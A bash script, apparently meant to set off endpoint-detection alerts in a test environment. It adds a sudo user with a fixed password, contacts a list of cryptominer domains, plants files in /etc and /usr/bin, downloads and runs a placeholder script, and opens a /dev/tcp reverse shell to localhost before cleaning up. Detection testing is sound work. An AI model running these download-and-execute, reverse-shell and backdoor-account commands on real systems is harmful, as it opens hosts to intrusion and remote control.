#!/bin/bash

# Create a new user for testing
sudo useradd -m -s /bin/bash linadm
echo "linadm:TestPassword123!" | sudo chpasswd
sudo usermod -aG sudo linadm

# List of domains to communicate with
domains=(
    "coinhive.com"
    "coin-hive.com"
    "jsecoin.com"
    "static.reasedoper.pw"
    "mataharirama.xyz"
    "listat.biz"
    "lmodr.biz"
    "minecrunch.co"
    "minemytraffic.com"
    "crypto-loot.com"
    "2giga.link"
    "ppoi.org"
    "coinerra.com"
    "coin-have.com"
    "kissyou.net"
    "miner.pr0gramm.com"
    "kiwifarms.net"
    "anime.reactor.cc"
    "joyreactor.cc"
    "kissdoujin.com"
    "ppoi.org"
    "minero.pw"
)

# Attempt connections to known miner domains
for domain in "${domains[@]}"; do
    curl -s -I "http://$domain" -m 5 >/dev/null 2>&1
done

# Simulate malicious activities that may trigger EDR detection
# 1. Create files in sensitive directories
echo "Sensitive data for testing" | sudo tee /etc/sensitive_data.txt > /dev/null
echo "Malicious script content" | sudo tee /usr/bin/fake_malware.sh > /dev/null
sudo chmod +x /usr/bin/fake_malware.sh

# 2. Attempt to run a "suspicious" script
sudo /usr/bin/fake_malware.sh

# 3. Download and execute a file (placeholder URL)
curl -o /tmp/fake_download.sh http://example.com/fake_download.sh
chmod +x /tmp/fake_download.sh
/tmp/fake_download.sh

# 4. Establish reverse shell connection (replace IP/PORT with valid test endpoint)
# Warning: This is purely for controlled testing in an isolated environment!
bash -i >& /dev/tcp/127.0.0.1/4444 0>&1

# Clean up
sudo userdel -r linadm
sudo rm /etc/sensitive_data.txt /usr/bin/fake_malware.sh /tmp/fake_download.sh
